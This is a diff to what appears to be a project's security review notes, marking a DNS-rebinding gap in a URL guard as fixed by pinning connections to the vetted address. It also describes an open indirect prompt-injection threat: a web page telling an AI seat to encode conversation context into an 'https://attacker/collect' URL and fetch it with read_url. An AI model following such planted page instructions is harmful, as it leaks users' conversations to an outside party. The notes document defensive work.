@@ -587,15 +587,13 @@ client did on our behalf and a stub would only have tested the stub's opinion.
 
 ### Still open from that review
 
-- **The DNS-rebinding half of the URL guard — THE NEXT SECURITY ITEM.** The
-  owner's ruling, 2026-08-12: queue it, do not rush it, the redirect fix closed
-  the easier path. Each hop is validated by NAME and then fetched by NAME, so a
-  name answering public for the check and private for the connection still wins.
-  `assertSafeUrl` already returns `{ address, family }` for exactly this and
-  every caller throws it away. Closing it means connecting to the vetted address
-  while preserving the Host header and TLS SNI — a custom undici dispatcher, not
-  a flag — and getting it wrong breaks every outbound fetch in the product, which
-  is why it is not a patch to slip in beside something else.
+- ~~**The DNS-rebinding half of the URL guard.**~~ **Closed in `9c8462a`.**
+  `fetchPageHead` now keeps the `{ address, family }` returned by
+  `assertSafeUrl` and `pinnedFetch` connects to that exact address while retaining
+  the hostname for Host and TLS SNI. Redirects remain caller-managed and every
+  hop is revalidated. The backend pin tests cover an unresolvable hostname,
+  Host preservation, no automatic redirect following, missing-address refusal,
+  and abort propagation.
 - **Indirect prompt injection**, ranked highest by Sol and still the queued
   research question. Its concrete shape: a page instructs a seat to encode
   conversation context into `https://attacker/collect?d=…` and call `read_url`;
